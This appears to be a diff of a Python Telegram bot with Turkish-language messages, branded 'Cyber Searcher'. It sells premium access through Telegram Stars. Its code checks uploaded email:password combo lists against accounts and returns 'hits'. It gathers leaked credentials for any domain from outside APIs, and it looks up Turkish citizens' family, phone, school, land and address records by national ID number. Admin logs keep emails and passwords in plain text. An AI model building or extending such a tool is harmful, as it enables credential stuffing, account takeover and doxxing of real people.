                         bot_instance.register_next_step_handler(m, lambda m: _process_capture_file(m, bot_instance, target_app))
@@ -4628,30 +4560,26 @@ def register_handlers(bot_instance):
         uid = msg.from_user.id
         username = msg.from_user.username or msg.from_user.first_name or str(uid)
         payload = msg.successful_payment.invoice_payload
-
         if payload == "premium":
             set_premium(uid, username)
-            bot_instance.reply_to(msg, "🎉 **Hotmail Premium aktif!**\n\n📧 Sınırsız Hotmail Check + 📸 Sınırsız Capture + 🔖 Sınırsız Keyword erişimi kazandın.")
+            bot_instance.reply_to(msg, "🎉 **Hotmail Premium aktif!**\n📧 Sınırsız Hotmail Check + 📸 Sınırsız Capture + 🔖 Sınırsız Keyword erişimi kazandın.")
             bot_instance.send_message(
                 ADMIN_ID,
                 f"📧 <b>YENİ HOTMAIL PREMIUM</b>\n👤 @{username}\n🆔 {uid}\n💰 {PREMIUM_PRICE} Stars"
             )
         elif payload == "osint":
             set_premium_osint(uid, username)
-            bot_instance.reply_to(msg, "🌍 **OSINT Premium aktif!**\n\n🔍 LeakSights OSINT (30+ Sorgu) erişimi kazandın.")
+            bot_instance.reply_to(msg, "🌍 **OSINT Premium aktif!**\n🔍 LeakSights OSINT (30+ Sorgu) erişimi kazandın.")
             bot_instance.send_message(
                 ADMIN_ID,
                 f"🌍 <b>YENİ OSINT PREMIUM</b>\n👤 @{username}\n🆔 {uid}\n💰 {OSINT_PRICE} Stars"
             )
 
-
 # ══════════════════════════════════════════════════════════════
 #  PROCESS FUNCTIONS
 # ══════════════════════════════════════════════════════════════
-
 def _resolve_target(text):
     text = text.strip()
-
     if text.startswith("@"):
         username = text[1:]
         row = find_user_by_username(username)
@@ -4672,17 +4600,13 @@ def _resolve_target(text):
             return (user_id, str(user_id))
     return (None, None)
 
-
 def _admin_premium_select_user(msg, bot_instance):
     target = msg.text.strip()
     tid, tuname = _resolve_target(target)
-
     if not tid:
         bot_instance.reply_to(msg, "❌ Kullanıcı bulunamadı! Lütfen @kullaniciadi veya ID girin.")
         return
-
     add_user(tid, tuname or "", "Premium Verildi")
-
     mk = InlineKeyboardMarkup(row_width=1)
     mk.add(
         _btn("📧 Hotmail Premium Ver", f"adm_give_hotmail_{tid}_{tuname or tid}"),
@@ -4691,10 +4615,9 @@ def _admin_premium_select_user(msg, bot_instance):
     )
     bot_instance.send_message(
         msg.chat.id,
-        f"👤 Kullanıcı: @{tuname or tid} (ID: {tid})\n\nHangi premiumu vermek istiyorsun?",
+        f"👤 Kullanıcı: @{tuname or tid} (ID: {tid})\nHangi premiumu vermek istiyorsun?",
         reply_markup=mk
     )
-
 
 def _admin_give_premium_hotmail(call, tid, tuname, bot_instance):
     cid = call.message.chat.id
@@ -4713,7 +4636,6 @@ def _admin_give_premium_hotmail(call, tid, tuname, bot_instance):
         except:
             pass
 
-
 def _admin_give_premium_osint(call, tid, tuname, bot_instance):
     cid = call.message.chat.id
     mid = call.message.message_id
@@ -4730,7 +4652,6 @@ def _admin_give_premium_osint(call, tid, tuname, bot_instance):
             bot_instance.answer_callback_query(call.id, "✅ OSINT Premium verildi!")
         except:
             pass
-
 
 def _admin_give_premium_capture(call, tid, tuname, bot_instance):
     cid = call.message.chat.id
@@ -4749,40 +4670,32 @@ def _admin_give_premium_capture(call, tid, tuname, bot_instance):
         except:
             pass
 
-
 def _process_add_keyword(msg, bot_instance, uid):
     text = msg.text.strip()
     if not text:
         bot_instance.reply_to(msg, "❌ Geçersiz keyword!")
         return
-
     new_keywords = [k.strip().lower() for k in text.split(',') if k.strip()]
-
     if not new_keywords:
         bot_instance.reply_to(msg, "❌ Geçersiz keyword!")
         return
-
     current_keywords = get_user_keywords(uid)
     added = []
     failed = []
-
     for kw in new_keywords:
         if kw in current_keywords:
             failed.append(f"'{kw}' zaten mevcut")
             continue
-
         if not can_add_keyword(uid):
             failed.append(f"Limit dolu! ({get_keyword_limit_text(uid)})")
             break
-
         current_keywords.append(kw)
         added.append(kw)
-
     if added:
         set_user_keywords(uid, current_keywords)
         bot_instance.reply_to(
             msg,
-            f"✅ **Keywordler eklendi!**\n\n"
+            f"✅ **Keywordler eklendi!**\n"
             f"➕ Eklenen: {', '.join(added)}\n"
             f"📊 Mevcut: {', '.join(current_keywords)}\n"
             f"📌 Limit: {get_keyword_limit_text(uid)}"
@@ -4790,149 +4703,128 @@ def _process_add_keyword(msg, bot_instance, uid):
     else:
         bot_instance.reply_to(
             msg,
-            f"❌ **Keyword eklenemedi!**\n\n"
+            f"❌ **Keyword eklenemedi!**\n"
             f"{', '.join(failed)}\n"
             f"📊 Mevcut: {', '.join(current_keywords)}"
         )
-
 
 def _process_del_keyword(msg, bot_instance, uid):
     text = msg.text.strip().lower()
     if not text:
         bot_instance.reply_to(msg, "❌ Geçersiz keyword!")
         return
-
     del_keywords = [k.strip() for k in text.split(',') if k.strip()]
-
     if not del_keywords:
         bot_instance.reply_to(msg, "❌ Geçersiz keyword!")
         return
-
     current_keywords = get_user_keywords(uid)
     removed = []
     not_found = []
-
     for kw in del_keywords:
         if kw in current_keywords:
             current_keywords.remove(kw)
             removed.append(kw)
         else:
             not_found.append(kw)
-
     if removed:
         set_user_keywords(uid, current_keywords)
-
-        result_msg = f"✅ **Keywordler silindi!**\n\n"
+        result_msg = f"✅ **Keywordler silindi!**\n"
         result_msg += f"🗑️ Silinen: {', '.join(removed)}\n"
         if not_found:
             result_msg += f"❌ Bulunamadı: {', '.join(not_found)}\n"
         result_msg += f"\n📊 Mevcut: {', '.join(current_keywords)}\n"
         result_msg += f"📌 Limit: {get_keyword_limit_text(uid)}"
-
         bot_instance.reply_to(msg, result_msg)
     else:
         bot_instance.reply_to(
             msg,
-            f"❌ **Hiçbir keyword silinemedi!**\n\n"
+            f"❌ **Hiçbir keyword silinemedi!**\n"
             f"❌ Bulunamadı: {', '.join(not_found)}\n"
             f"📊 Mevcut: {', '.join(current_keywords)}"
         )
 
-
 def _process_capture_file(msg, bot_instance, target_app):
     uid = msg.from_user.id
-
     if not msg.document:
         bot_instance.reply_to(msg, "❌ Lütfen geçerli bir dosya gönderin!")
         return
-
     try:
         file_info = bot_instance.get_file(msg.document.file_id)
         downloaded = bot_instance.download_file(file_info.file_path)
         combo_text = downloaded.decode("utf-8", errors="ignore")
         combo_list = [line.strip() for line in combo_text.splitlines() if line.strip() and ":" in line.strip()]
-
         if not combo_list:
             bot_instance.reply_to(msg, "❌ Dosyada geçerli combo bulunamadı!")
             return
-
         if not can_use_capture(uid):
             bot_instance.reply_to(
                 msg,
-                f"❌ **Capture hakkınız doldu!**\n\n"
+                f"❌ **Capture hakkınız doldu!**\n"
                 f"📊 Kullanım: {get_capture_used(uid)} / {FREE_CAPTURE_LIMIT}\n"
                 f"⭐ Premium ile sınırsız kullanabilirsiniz."
             )
             return
-
+            
         platform_name = "Tüm Platformlar"
         if target_app:
             for num, app_mail in CAPTURE_APPS.items():
                 if app_mail == target_app:
                     platform_name = CAPTURE_NAMES[num]
                     break
-
+                    
         increment_capture_used(uid)
-
         status_msg = bot_instance.reply_to(
             msg,
-            f"📸 **Capture Taraması Başladı!**\n\n"
+            f"📸 **Capture Taraması Başladı!**\n"
             f"📂 Toplam: {len(combo_list)} satır\n"
             f"🎯 Hedef: {platform_name}\n"
             f"⏳ Lütfen bekleyin..."
         )
-
+        
         def run_capture():
             user_name = get_user_name(uid)
             is_prem = is_premium(uid)
             start_capture_scan(combo_list, uid, user_name, is_prem, target_app)
-
             with CAPTURE_LOCK:
                 results = CAPTURE_RESULTS.get(uid, [])
                 bad_count = CAPTURE_BAD
                 processed = CAPTURE_PROCESSED
-
-            if results:
-                msg_text = (
-                    f"✅ **Capture Taraması Tamamlandı!**\n\n"
-                    f"📊 Toplam Hit: {len(results)}\n"
-                    f"❌ Bad: {bad_count}\n"
-                    f"📂 İşlenen: {processed}"
-                )
-
-                try:
-                    bot_instance.edit_message_text(msg_text, uid, status_msg.message_id)
-
-                    if os.path.exists(f"capture_hits_{uid}.txt") and os.path.getsize(f"capture_hits_{uid}.txt") > 0:
-                        with open(f"capture_hits_{uid}.txt", "rb") as f:
-                            bot_instance.send_document(
-                                uid, f,
-                                caption=f"📸 {len(results)}x Capture Hit"
-                            )
-                        os.remove(f"capture_hits_{uid}.txt")
-                except:
-                    pass
-            else:
-                try:
-                    bot_instance.edit_message_text(
-                        f"❌ **Hit bulunamadı!**\n\n"
-                        f"📂 İşlenen: {processed}\n"
-                        f"❌ Bad: {bad_count}",
-                        uid, status_msg.message_id
+                if results:
+                    msg_text = (
+                        f"✅ **Capture Taraması Tamamlandı!**\n"
+                        f"📊 Toplam Hit: {len(results)}\n"
+                        f"❌ Bad: {bad_count}\n"
+                        f"📂 İşlenen: {processed}"
                     )
-                except:
-                    pass
-
+                    try:
+                        bot_instance.edit_message_text(msg_text, uid, status_msg.message_id)
+                        if os.path.exists(f"capture_hits_{uid}.txt") and os.path.getsize(f"capture_hits_{uid}.txt") > 0:
+                            with open(f"capture_hits_{uid}.txt", "rb") as f:
+                                bot_instance.send_document(
+                                    uid, f,
+                                    caption=f"📸 {len(results)}x Capture Hit"
+                                )
+                            os.remove(f"capture_hits_{uid}.txt")
+                    except:
+                        pass
+                else:
+                    try:
+                        bot_instance.edit_message_text(
+                            f"❌ **Hit bulunamadı!**\n"
+                            f"📂 İşlenen: {processed}\n"
+                            f"❌ Bad: {bad_count}",
+                            uid, status_msg.message_id
+                        )
+                    except:
+                        pass
+                        
         threading.Thread(target=run_capture, daemon=True).start()
-
     except Exception as e:
         bot_instance.reply_to(msg, f"❌ Dosya okunamadı: {e}")
-
 
 # ══════════════════════════════════════════════════════════════
 #  HELPER FUNCTIONS
 # ══════════════════════════════════════════════════════════════
-
 def _show_stats(chat_id, uid, bot_instance):
     row = get_user_stats(uid)
     if not row:
@@ -4941,8 +4833,7 @@ def _show_stats(chat_id, uid, bot_instance):
     checks, combos, jdate, is_prem, is_prem_osint, prem_date, prem_osint_date, uname, fname, keywords, is_banned_user, ban_reason, capture_used = row
     daily = get_daily_usage(uid)
     limit = PREMIUM_CHECK_LIMIT if is_prem else FREE_CHECK_LIMIT
-
-    txt = (f"{s(uid, 'stats_title')}\n{'─' * 30}\n\n"
+    txt = (f"{s(uid, 'stats_title')}\n{'─' * 30}\n"
            f"🔍 Sorgu: <b>{checks}</b>\n📦 Combo: <b>{combos}</b>\n"
            f"📧 Hotmail Premium: {'⭐ AKTİF' if is_prem else '❌ Pasif'}\n"
            f"🌍 OSINT Premium: {'⭐ AKTİF' if is_prem_osint else '❌ Pasif'}\n"
@@ -4950,7 +4841,6 @@ def _show_stats(chat_id, uid, bot_instance):
            f"📸 Capture: {capture_used}/{'♾️' if is_prem else FREE_CAPTURE_LIMIT}\n"
            f"\n👨‍💻 @hackledin")
     bot_instance.send_message(chat_id, txt)
-
 
 def _show_profile(chat_id, uid, bot_instance):
     row = get_user_stats(uid)
@@ -4962,28 +4852,26 @@ def _show_profile(chat_id, uid, bot_instance):
     daily = get_daily_usage(uid)
     limit = PREMIUM_CHECK_LIMIT if is_prem else FREE_CHECK_LIMIT
     kw_list = keywords.split(',') if keywords else []
-
     txt = (f"⚡️ **SİSTEME HOŞGELDİNİZ**\n"
            f"{user_name} — {uid}\n"
-           f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+           f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 **KULLANICI PROFİLİ**\n"
            f"┣ Durum: {'🔴 YASAKLI' if is_banned_user else '🟢 ÇEVRİMİÇİ (ONLINE)'}\n"
-           f"┗ Lisans: {'⭐ PREMIUM' if is_prem else '🆓 FREE USER'} — 📊 Günlük Limitli ({limit})\n\n"
+           f"┗ Lisans: {'⭐ PREMIUM' if is_prem else '🆓 FREE USER'} — 📊 Günlük Limitli ({limit})\n"
            f"📊 **SİSTEM İSTATİSTİKLERİ**\n"
            f"┣ Günlük Kullanım: {daily['checks']} / {limit}\n"
            f"┣ Toplam Check:    {checks + combos}\n"
            f"┣ Toplam Hit:      {daily['hits']}\n"
            f"┣ Thread Sayısı:   {HOTMAIL_THREADS} (10-100)\n"
            f"┣ Keywordler:      {len(kw_list)} / {get_keyword_limit_text(uid)}\n"
-           f"┗ Capture Kullanım: {capture_used} / {'♾️' if is_prem else FREE_CAPTURE_LIMIT}\n\n"
+           f"┗ Capture Kullanım: {capture_used} / {'♾️' if is_prem else FREE_CAPTURE_LIMIT}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⭐ **PREMIUM DURUM**\n"
            f"📧 Hotmail: {'⭐ AKTİF' if is_prem else '❌ Pasif'}\n"
            f"🌍 OSINT: {'⭐ AKTİF' if is_prem_osint else '❌ Pasif'}\n"
-           f"📅 Tarih: {prem_date or '—'}\n\n"
+           f"📅 Tarih: {prem_date or '—'}\n"
            f"👨‍💻 @hackledin")
     bot_instance.send_message(chat_id, txt)
-
 
 def _show_leaderboard(chat_id, uid, bot_instance):
     conn = sqlite3.connect(DB_PATH)
@@ -4991,20 +4879,17 @@ def _show_leaderboard(chat_id, uid, bot_instance):
     c.execute("SELECT user_id,username,first_name,total_checks,total_combos,is_premium,is_premium_osint FROM users WHERE is_banned=0 ORDER BY total_combos DESC LIMIT 10")
     users = c.fetchall()
     conn.close()
-
     if not users:
-        bot_instance.send_message(chat_id, s(uid, "lb_title") + "\n\n❌ Henüz veri yok.")
+        bot_instance.send_message(chat_id, s(uid, "lb_title") + "\n❌ Henüz veri yok.")
         return
-
     medals = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"]
-    txt = f"{s(uid, 'lb_title')}\n{'─' * 30}\n\n"
+    txt = f"{s(uid, 'lb_title')}\n{'─' * 30}\n"
     for i, (u_id, uname, fname, tchk, tcmb, is_prem, is_prem_osint) in enumerate(users):
         nm = (fname or uname or str(u_id))[:15]
         pk = "⭐" if (is_prem or is_prem_osint) else ""
-        txt += f"{medals[i]} <b>{nm}</b> {pk}\n   📦 {tcmb}  🔍 {tchk}\n\n"
+        txt += f"{medals[i]} <b>{nm}</b> {pk}\n📦 {tcmb}  🔍 {tchk}\n"
     txt += f"👨‍💻 @hackledin"
     bot_instance.send_message(chat_id, txt)
-
 
 def _show_api_menu(chat_id, uid, bot_instance, edit=None):
     cur = api_pref(uid)
@@ -5024,11 +4909,10 @@ def _show_api_menu(chat_id, uid, bot_instance, edit=None):
             pass
     bot_instance.send_message(chat_id, txt, reply_markup=mk)
 
-
 def _show_help(chat_id, uid, bot_instance):
-    txt = get_help_content(uid)
+    status = "⭐ PREMIUM" if is_premium(uid) else "🆓 Ücretsiz"
+    txt = s(uid, "help_content", status=status)
     bot_instance.send_message(chat_id, txt)
-
 
 def _process_combo(msg, bot_instance):
     uid = msg.from_user.id
@@ -5046,10 +4930,10 @@ def _process_combo(msg, bot_instance):
     now = datetime.now()
     fname = f"{domain}_{now.strftime('%Y%m%d_%H%M%S')}.txt"
     with open(fname, "w", encoding="utf-8") as f:
-        f.write(f"{'=' * 60}\n CYBER SEARCHER — {domain.upper()}\n{'=' * 60}\n")
-        f.write(f" Toplam: {len(combos)}\n Tarih: {now.strftime('%d.%m.%Y %H:%M')}\n{'=' * 60}\n\n")
+        f.write(f"{'=' * 60}\nCYBER SEARCHER — {domain.upper()}\n{'=' * 60}\n")
+        f.write(f" Toplam: {len(combos)}\nTarih: {now.strftime('%d.%m.%Y %H:%M')}\n{'=' * 60}\n")
         f.write("\n".join(combos))
-        f.write(f"\n\n{'=' * 60}\n @hackledin\n")
+        f.write(f"\n{'=' * 60}\n@hackledin\n")
     with open(fname, "rb") as f:
         bot_instance.send_document(msg.chat.id, f,
                                    caption=s(uid, "combo_caption", domain=domain, count=len(combos), apis=apis))
@@ -5059,14 +4943,12 @@ def _process_combo(msg, bot_instance):
     except:
         pass
 
-
 def _combo_engine(domain, limit=None):
     for bad in YASAKLI:
         if bad in domain.lower():
             return None, f"Yasaklı domain: {bad}", None
     combos = []
     apis = []
-
     def _extract(line):
         line = str(line)
         m = re.search(r"://[^/]+/[^:]*:(.+?):(.+)$", line)
@@ -5076,7 +4958,7 @@ def _combo_engine(domain, limit=None):
         if len(parts) >= 2:
             return parts[-2].strip(), parts[-1].strip()
         return None, None
-
+        
     for api in API_LIST:
         try:
             r = requests.get(api["url"] + domain, headers={"User-Agent": "Mozilla/5.0"}, timeout=10, verify=False)
@@ -5098,17 +4980,17 @@ def _combo_engine(domain, limit=None):
             apis.append(api["name"])
         except:
             pass
+            
     uniq = list(set(combos))
     if limit:
         uniq = uniq[:limit]
     return uniq, None, " + ".join(apis)
 
-
 def _process_turkey(msg, tool, bot_instance):
     uid = msg.from_user.id
     param = msg.text.strip()
     l = lang(uid)
-    if tool in ("tc", "tcpro", "aile", "ailepro", "sulale", "tcgsm", "eokul", "tapu"):
+    if tool in ("tc", "tcpro", "aile", "ailepro", "sulale", "tcgsm", "eokul", "tapu", "adres"):
         if not (param.isdigit() and len(param) == 11):
             bot_instance.reply_to(msg, s(uid, "invalid_tc"))
             return
@@ -5127,6 +5009,7 @@ def _process_turkey(msg, tool, bot_instance):
         if "," not in param:
             bot_instance.reply_to(msg, s(uid, "invalid_adaparsel"))
             return
+            
     sm = bot_instance.reply_to(msg, s(uid, "processing"))
     api_cfg = TURKIYE_API[tool]
     url = api_cfg["url"]
@@ -5140,6 +5023,7 @@ def _process_turkey(msg, tool, bot_instance):
         url = url.replace("{il}", pts[0].strip().upper()).replace("{ilce}", pts[1].strip().upper())
     else:
         url = url.replace("{tc}", param)
+        
     data, err = _api_get(url)
     if err:
         bot_instance.edit_message_text(err, msg.chat.id, sm.message_id)
@@ -5149,7 +5033,6 @@ def _process_turkey(msg, tool, bot_instance):
                      f"Turkey_{tool}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", result,
                      s(uid, "tr_caption", tool=tool.upper(), param=param,
                        date=datetime.now().strftime("%d.%m.%Y %H:%M")))
-
 
 def _process_ls(msg, key, bot_instance):
     uid = msg.from_user.id
@@ -5170,7 +5053,6 @@ def _process_ls(msg, key, bot_instance):
                      f"LS_{key}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", result,
                      s(uid, "ls_caption", val=val, date=datetime.now().strftime("%d.%m.%Y %H:%M")))
 
-
 def _api_get(url):
     try:
         h = {"User-Agent": "Mozilla/5.0"}
@@ -5186,11 +5068,9 @@ def _api_get(url):
     except Exception as e:
         return None, f"❌ {e}"
 
-
 def _fmt_generic(title, data, queried, header_extra=""):
     now = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
     lines = ["=" * 60, f" {title}", "=" * 60, f" Aranan  : {queried}", f" Tarih   : {now}", "=" * 60, ""]
-
     def _dump(obj, indent=0):
         prefix = "  " * indent
         if isinstance(obj, dict):
@@ -5210,11 +5090,9 @@ def _fmt_generic(title, data, queried, header_extra=""):
         else:
             if str(obj).strip():
                 lines.append(f"{prefix}{obj}")
-
     _dump(data)
     lines += ["", "=" * 60, f" {header_extra} — Cyber Searcher", " Developer: @hackledin", "=" * 60]
     return "\n".join(lines)
-
 
 def _send_txt_result(chat_id, status_mid, bot_instance, fname, content, caption):
     try:
@@ -5233,75 +5111,6 @@ def _send_txt_result(chat_id, status_mid, bot_instance, fname, content, caption)
         except:
             pass
 
-
-def _download_video(link):
-    os.makedirs("downloads", exist_ok=True)
-    out_template = os.path.join("downloads", "%(id)s.%(ext)s")
-    opts = {
-        "format": "bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best",
-        "outtmpl": out_template,
-        "noplaylist": True,
-        "quiet": True,
-        "no_warnings": True,
-        "max_filesize": 50 * 1024 * 1024,
-    }
-    try:
-        with YoutubeDL(opts) as ydl:
-            info = ydl.extract_info(link, download=True)
-            if "requested_downloads" in info and info["requested_downloads"]:
-                path = info["requested_downloads"][0]["filepath"]
-            else:
-                path = ydl.prepare_filename(info)
-            if not os.path.exists(path):
-                base, _ = os.path.splitext(path)
-                for ext in [".mp4", ".mkv", ".webm"]:
-                    if os.path.exists(base + ext):
-                        path = base + ext
-                        break
-            if not os.path.exists(path):
-                return {"ok": False, "err": "İndirilen video dosyası bulunamadı."}
-            size = os.path.getsize(path)
-            if size > 50 * 1024 * 1024:
-                os.remove(path)
-                return {"ok": False, "err": f"Video boyutu ({size / (1024*1024):.1f}MB) Telegram'ın 50MB bot limitini aşıyor."}
-            return {
-                "ok": True,
-                "path": path,
-                "title": info.get("title", "Video"),
-                "size": f"{size / (1024 * 1024):.1f}MB",
-                "dur": info.get("duration", "?"),
-                "upl": info.get("uploader", "?")
-            }
-    except Exception as e:
-        return {"ok": False, "err": str(e)}
-
-
-def _process_video(msg, bot_instance):
-    uid = msg.from_user.id
-    link = msg.text.strip()
-    if not link.startswith(("http://", "https://")):
-        bot_instance.reply_to(msg, s(uid, "invalid_link"))
-        return
-    sm = bot_instance.reply_to(msg, s(uid, "video_wait"))
-    res = _download_video(link)
-    if not res["ok"]:
-        bot_instance.edit_message_text(s(uid, "video_err", err=res["err"]), msg.chat.id, sm.message_id)
-        return
-    cap = s(uid, "video_caption", title=res["title"][:60], size=res["size"], dur=res["dur"], upl=res["upl"])
-    try:
-        with open(res["path"], "rb") as f:
-            bot_instance.send_video(msg.chat.id, f, caption=cap, supports_streaming=True, timeout=120)
-    except Exception as e:
-        bot_instance.edit_message_text(f"❌ Gönderme hatası: {e}", msg.chat.id, sm.message_id)
-    finally:
-        if os.path.exists(res["path"]):
-            os.remove(res["path"])
-        try:
-            bot_instance.delete_message(msg.chat.id, sm.message_id)
-        except:
-            pass
-
-
 def _process_addbot(msg, bot_instance):
     uid = msg.from_user.id
     token = msg.text.strip()
@@ -5315,16 +5124,15 @@ def _process_addbot(msg, bot_instance):
         if token in _CHILD_PROCS and _CHILD_PROCS[token].poll() is None:
             bot_instance.reply_to(msg, s(uid, "multi_bot_exists"))
             return
-    try:
-        success = _spawn_bot(token, uid)
-        if success:
-            bot_instance.reply_to(msg, s(uid, "multi_bot_added", token=token[:20] + "...",
-                                         owner=msg.from_user.first_name or str(uid)))
-        else:
-            bot_instance.reply_to(msg, "❌ Bot başlatılamadı!")
-    except Exception as e:
-        bot_instance.reply_to(msg, f"❌ Hata: {e}")
-
+        try:
+            success = _spawn_bot(token, uid)
+            if success:
+                bot_instance.reply_to(msg, s(uid, "multi_bot_added", token=token[:20] + "...",
+                                             owner=msg.from_user.first_name or str(uid)))
+            else:
+                bot_instance.reply_to(msg, "❌ Bot başlatılamadı!")
+        except Exception as e:
+            bot_instance.reply_to(msg, f"❌ Hata: {e}")
 
 def _process_special_tool(msg, tool, bot_instance):
     uid = msg.from_user.id
@@ -5345,7 +5153,6 @@ def _process_special_tool(msg, tool, bot_instance):
     else:
         bot_instance.edit_message_text(f"<code>{result}</code>", msg.chat.id, sm.message_id)
 
-
 def _process_generic_tool(msg, tool, bot_instance):
     uid = msg.from_user.id
     val = msg.text.strip()
@@ -5356,11 +5163,10 @@ def _process_generic_tool(msg, tool, bot_instance):
             out = json.dumps(resp.json(), indent=2, ensure_ascii=False)
         except:
             out = resp.text
-        bot_instance.edit_message_text(f"✅ <b>{tool.upper()}</b>\n\n<code>{out[:4000]}</code>",
+        bot_instance.edit_message_text(f"✅ <b>{tool.upper()}</b>\n<code>{out[:4000]}</code>",
                                        msg.chat.id, sm.message_id)
     except Exception as e:
         bot_instance.edit_message_text(f"❌ {e}", msg.chat.id, sm.message_id)
-
 
 def _proxycheck(ip):
     try:
@@ -5391,7 +5197,6 @@ def _proxycheck(ip):
     except Exception as e:
         return f"❌ {e}"
 
-
 def _urlscan(domain):
     try:
         r = requests.get(f"https://urlscan.io/api/v1/search/?q={domain}",
@@ -5413,24 +5218,21 @@ def _urlscan(domain):
     except Exception as e:
         return f"❌ {e}"
 
-
 def _run_predunyam(chat_id, uid, bot_instance):
     try:
         r = requests.get(TOOLS_API["predunyam"], timeout=10, verify=False)
-        bot_instance.send_message(chat_id, f"💎 <b>PreDunyam</b>\n\n<code>{r.text[:4000]}</code>")
+        bot_instance.send_message(chat_id, f"💎 <b>PreDunyam</b>\n<code>{r.text[:4000]}</code>")
     except Exception as e:
         bot_instance.send_message(chat_id, f"❌ {e}")
-
 
 def _handle_admin_cb(call, action, bot_instance):
     uid = call.from_user.id
     cid = call.message.chat.id
     mid = call.message.message_id
-
     try:
         if action == "stats":
             tu, prem_pu, osint_pu, tc, tch = get_bot_stats()
-            txt = (f"📊 <b>BOT İSTATİSTİK</b>\n{'─' * 30}\n\n"
+            txt = (f"📊 <b>BOT İSTATİSTİK</b>\n{'─' * 30}\n"
                    f"👥 Toplam Kullanıcı: <b>{tu}</b>\n"
                    f"📧 Hotmail Premium: <b>{prem_pu or 0}</b>\n"
                    f"🌍 OSINT Premium: <b>{osint_pu or 0}</b>\n"
@@ -5445,7 +5247,6 @@ def _handle_admin_cb(call, action, bot_instance):
             except:
                 pass
             return
-
         elif action == "prem_users":
             conn = sqlite3.connect(DB_PATH)
             c = conn.cursor()
@@ -5458,7 +5259,7 @@ def _handle_admin_cb(call, action, bot_instance):
                 except:
                     pass
                 return
-            txt = "⭐ <b>PREMIUM KULLANICILARI</b>\n\n"
+            txt = "⭐ <b>PREMIUM KULLANICILARI</b>\n"
             for u_id, uname, fname, prem_date, osint_date in users:
                 txt += f"👤 @{uname or fname or u_id}\n"
                 if prem_date:
@@ -5475,7 +5276,6 @@ def _handle_admin_cb(call, action, bot_instance):
             except:
                 pass
             return
-
         elif action == "prem_log":
             logs = get_premium_logs(20)
             if not logs:
@@ -5484,7 +5284,7 @@ def _handle_admin_cb(call, action, bot_instance):
                 except:
                     pass
                 return
-            txt = "📋 <b>PREMIUM LOG</b>\n\n"
+            txt = "📋 <b>PREMIUM LOG</b>\n"
             for u_id, uname, package, amount, date in logs:
                 txt += f"👤 @{uname or u_id}  📦 {package}  💰 {amount}⭐  📅 {date}\n"
             try:
@@ -5496,11 +5296,10 @@ def _handle_admin_cb(call, action, bot_instance):
             except:
                 pass
             return
-
         elif action == "give_premium":
             m = bot_instance.send_message(
                 cid,
-                "⭐ **Premium Ver**\n\n"
+                "⭐ **Premium Ver**\n"
                 "Kullanıcı ID veya @kullanıcıadı gir:\n"
                 "Örnek: @user veya 123456789"
             )
@@ -5510,32 +5309,28 @@ def _handle_admin_cb(call, action, bot_instance):
             except:
                 pass
             return
-
         elif action.startswith("give_hotmail_"):
             parts = action.split("_")
             tid = int(parts[2])
             tuname = parts[3] if len(parts) > 3 else str(tid)
             _admin_give_premium_hotmail(call, tid, tuname, bot_instance)
             return
-
         elif action.startswith("give_osint_"):
             parts = action.split("_")
             tid = int(parts[2])
             tuname = parts[3] if len(parts) > 3 else str(tid)
             _admin_give_premium_osint(call, tid, tuname, bot_instance)
             return
-
         elif action.startswith("give_capture_"):
             parts = action.split("_")
             tid = int(parts[2])
             tuname = parts[3] if len(parts) > 3 else str(tid)
             _admin_give_premium_capture(call, tid, tuname, bot_instance)
             return
-
         elif action == "remove":
             m = bot_instance.send_message(
                 cid,
-                "👤 **Premium Kaldır**\n\n"
+                "👤 **Premium Kaldır**\n"
                 "Kullanıcı ID veya @kullanıcıadı gir:"
             )
             bot_instance.register_next_step_handler(m, lambda m: _admin_remove(m, bot_instance))
@@ -5544,7 +5339,6 @@ def _handle_admin_cb(call, action, bot_instance):
             except:
                 pass
             return
-
         elif action == "ban":
             m = bot_instance.send_message(cid, "🚫 Banlamak istediğin kullanıcıyı gir (@kullanici veya ID):")
             bot_instance.register_next_step_handler(m, lambda m: _admin_ban(m, bot_instance))
@@ -5553,7 +5347,6 @@ def _handle_admin_cb(call, action, bot_instance):
             except:
                 pass
             return
-
         elif action == "unban":
             m = bot_instance.send_message(cid, "✅ Banını kaldırmak istediğin kullanıcıyı gir:")
             bot_instance.register_next_step_handler(m, lambda m: _admin_unban(m, bot_instance))
@@ -5562,22 +5355,20 @@ def _handle_admin_cb(call, action, bot_instance):
             except:
                 pass
             return
-
         elif action == "banned":
             banned = get_banned_users()
             if not banned:
                 bot_instance.send_message(cid, "📭 Yasaklı kullanıcı bulunamadı.")
             else:
-                txt = "🚫 <b>YASAKLI KULLANICILAR</b>\n\n"
+                txt = "🚫 <b>YASAKLI KULLANICILAR</b>\n"
                 for u_id, uname, fname, reason in banned:
-                    txt += f"👤 @{uname or fname or u_id}\n   📌 Sebep: {reason}\n\n"
+                    txt += f"👤 @{uname or fname or u_id}\n📌 Sebep: {reason}\n"
                 bot_instance.send_message(cid, txt[:4096])
             try:
                 bot_instance.answer_callback_query(call.id)
             except:
                 pass
             return
-
         elif action == "announce":
             m = bot_instance.send_message(cid, "📢 Duyuru mesajını gir:")
             bot_instance.register_next_step_handler(m, lambda m: _admin_announce(m, bot_instance))
@@ -5586,7 +5377,6 @@ def _handle_admin_cb(call, action, bot_instance):
             except:
                 pass
             return
-
         elif action == "listbots":
             registry = _load_registry()
             if not registry:
@@ -5612,13 +5402,12 @@ def _handle_admin_cb(call, action, bot_instance):
             except:
                 pass
             return
-
         elif action == "hotmail_log":
             logs = get_hotmail_logs(30)
             if not logs:
                 bot_instance.send_message(cid, "📭 Hotmail log kaydı bulunamadı.")
             else:
-                txt = "📋 <b>HOTMAIL LOG</b>\n\n"
+                txt = "📋 <b>HOTMAIL LOG</b>\n"
                 for u_id, uname, email, password, status, detail, date in logs:
                     status_emoji = "✅" if status == "HIT" else "🔐" if status == "2FA" else "❌" if status == "BAD" else "⚠️"
                     txt += f"{status_emoji} @{uname or u_id} | {email} | {status}"
@@ -5631,7 +5420,6 @@ def _handle_admin_cb(call, action, bot_instance):
             except:
                 pass
             return
-
     except Exception as e:
